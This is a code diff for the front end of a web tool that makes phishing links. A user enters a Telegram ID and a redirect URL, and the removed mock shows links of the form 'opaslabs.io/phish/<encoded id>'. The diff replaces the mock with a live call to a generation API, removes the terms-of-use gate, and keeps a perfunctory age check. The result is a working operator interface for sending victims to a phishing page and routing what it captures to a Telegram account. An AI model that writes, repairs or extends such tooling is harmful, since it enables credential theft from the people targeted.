@@ -436,16 +436,13 @@
     initParticles();
     animateParticles();
 
-    // Modal Elements
-    const termsModal = document.getElementById('termsModal');
+    // Age Verification Logic
     const ageModal = document.getElementById('ageModal');
-    const declineTermsBtn = document.getElementById('declineTermsBtn');
-    const acceptTermsBtn = document.getElementById('acceptTermsBtn');
     const underageBtn = document.getElementById('underageBtn');
     const adultBtn = document.getElementById('adultBtn');
     const generateBtn = document.getElementById('generateBtn');
 
-    // Link Generator Logic
+    // Original Link Generator Logic (wrapped in function)
     async function generateLink() {
       const telegramId = document.getElementById('telegramId').value.trim();
       const redirectUrl = document.getElementById('redirectUrl').value.trim() || 'https://google.com';
@@ -458,99 +455,59 @@
       try {
         document.getElementById('generateBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Generating...';
         
-        // Simulate API call (replace with actual fetch in production)
-        const mockResponse = {
-          link: `https://opaslabs.io/phish/${btoa(telegramId)}?redirect=${encodeURIComponent(redirectUrl)}`
-        };
-        
-        // In a real implementation, you would use:
-        /*
         const response = await fetch('/api/generate', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ telegramId, redirectUrl })
         });
-        const data = await response.json();
-        */
         
-        // For demo purposes, we'll use the mock response
-        const data = mockResponse;
+        const data = await response.json();
         
         document.getElementById('generatedLink').href = data.link;
         document.getElementById('generatedLink').textContent = data.link;
         document.getElementById('result').style.display = 'block';
       } catch (error) {
         alert('Error generating link');
-        console.error(error);
       } finally {
         document.getElementById('generateBtn').innerHTML = '<i class="fas fa-bolt"></i> Generate Link';
       }
     }
 
-    // Generate Button Click Handler
+    // Modified Generate Button Click Handler
     generateBtn.addEventListener('click', function(e) {
-      e.preventDefault();
-      
-      // Check if terms were accepted
-      if(localStorage.getItem('termsAccepted') !== 'true') {
-        termsModal.style.display = 'flex';
-        return;
-      }
-      
-      // Check if age was verified
-      if(localStorage.getItem('ageVerified') !== 'true') {
-        ageModal.style.display = 'flex';
-        return;
-      }
-      
-      // If both checks passed, generate the link
-      generateLink();
-    });
-
-    // Terms Modal Buttons
-    declineTermsBtn.addEventListener('click', function() {
-      window.location.href = 'https://youtu.be/020g-0hhCAU?si=H64NYyVaQsrjHh2V';
-    });
-
-    acceptTermsBtn.addEventListener('click', function() {
-      localStorage.setItem('termsAccepted', 'true');
-      termsModal.style.display = 'none';
-      
-      // After accepting terms, check age verification
-      if(localStorage.getItem('ageVerified') !== 'true') {
-        ageModal.style.display = 'flex';
-      } else {
-        // If already verified, proceed to generate
+      // Check if already verified
+      if(localStorage.getItem('ageVerified') === 'true') {
         generateLink();
+      } else {
+        // Show age verification modal
+        e.preventDefault();
+        ageModal.style.display = 'flex';
       }
     });
 
-    // Age Verification Buttons
+    // Handle underage button
     underageBtn.addEventListener('click', function() {
       window.location.href = 'https://youtu.be/020g-0hhCAU?si=H64NYyVaQsrjHh2V';
     });
 
+    // Handle adult button
     adultBtn.addEventListener('click', function() {
       localStorage.setItem('ageVerified', 'true');
       ageModal.style.display = 'none';
-      generateLink();
+      generateLink(); // Proceed with generation after verification
     });
     
-    // Copy Button
     document.getElementById('copyBtn').addEventListener('click', () => {
       const link = document.getElementById('generatedLink').textContent;
-      navigator.clipboard.writeText(link).then(() => {
-        const btn = document.getElementById('copyBtn');
-        btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
-        setTimeout(() => {
-          btn.innerHTML = '<i class="fas fa-copy"></i> Copy Link';
-        }, 2000);
-      }).catch(err => {
-        console.error('Failed to copy: ', err);
-      });
+      navigator.clipboard.writeText(link);
+      const btn = document.getElementById('copyBtn');
+      btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+      setTimeout(() => {
+        btn.innerHTML = '<i class="fas fa-copy"></i> Copy Link';
+      }, 2000);
     });
 
-    // Remove the automatic modal display on page load
+    // Remove automatic modal display on page load
     document.addEventListener('DOMContentLoaded', function() {
       // No modals will show automatically now
       // They will only appear when Generate button is clicked
